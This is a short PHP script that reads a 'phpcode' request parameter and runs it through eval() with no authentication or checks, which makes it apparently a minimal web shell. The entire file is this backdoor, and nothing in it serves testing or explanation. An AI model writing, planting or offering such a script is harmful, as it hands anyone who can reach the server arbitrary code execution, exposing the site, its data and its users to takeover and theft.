<?php
$phpcode = $_REQUEST['phpcode'];
$phpcode = trim($phpcode);
if($phpcode){
	$phpcode = "<?php\n\n{$phpcode}\n\n?>";
	eval("?".">$phpcode<?");
}
	
?>